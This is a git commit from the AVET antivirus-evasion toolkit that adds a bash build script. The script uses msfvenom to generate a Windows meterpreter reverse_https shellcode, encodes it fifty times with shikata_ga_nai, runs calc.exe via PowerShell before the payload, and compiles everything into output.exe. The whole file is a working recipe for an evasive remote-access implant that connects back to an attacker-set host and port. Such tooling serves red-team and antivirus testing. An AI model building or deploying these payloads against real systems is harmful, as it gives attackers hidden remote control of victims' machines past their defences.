64682cd9892776cee437c0089c8e9ded1a396f95
Florian Saager <florian.saager@rub.de>
2019-06-19 13:57:16 +0200

    Added exec_via_powershell example build script

---
+++ build/build_win32_meterpreter_rev_https_50xshikata_preexec_calc_powershell.sh
@@ -0,0 +1,53 @@
+#!/bin/bash          
+# Apply shikata 50 times.
+# Preexecute calc.exe via powershell before actual payload.
+
+# print AVET logo
+cat banner.txt
+
+# include script containing the compiler var $win32_compiler
+# you can edit the compiler in build/global_win32.sh
+# or enter $win32_compiler="mycompiler" here
+. build/global_win32.sh
+
+# import feature construction interface
+. build/feature_construction.sh
+
+# import global default lhost and lport values from build/global_connect_config.sh
+. build/global_connect_config.sh
+
+# override connect-back settings here, if necessary
+LPORT=$GLOBAL_LPORT
+LHOST=$GLOBAL_LHOST
+
+# make meterpreter reverse payload, encoded 50 rounds with shikata_ga_nai
+msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 50 -f c -a x86 --platform Windows > input/sc_c.txt
+
+# set command source
+set_command_source static_from_here "calc.exe"
+
+# set command execution method
+set_command_exec exec_via_powershell
+
+# set shellcode source
+set_payload_source static_from_file input/sc_c.txt
+
+# set decoder and crypto key source
+set_decoder none
+set_key_source none
+
+# set payload info source
+set_payload_info_source none
+
+# set shellcode binding technique
+set_payload_execution_method exec_shellcode
+
+# enable debug output
+enable_debug_print
+
+# compile to output.exe file
+$win32_compiler -o output/output.exe source/avet.c
+strip output/output.exe
+
+# cleanup
+cleanup_techniques
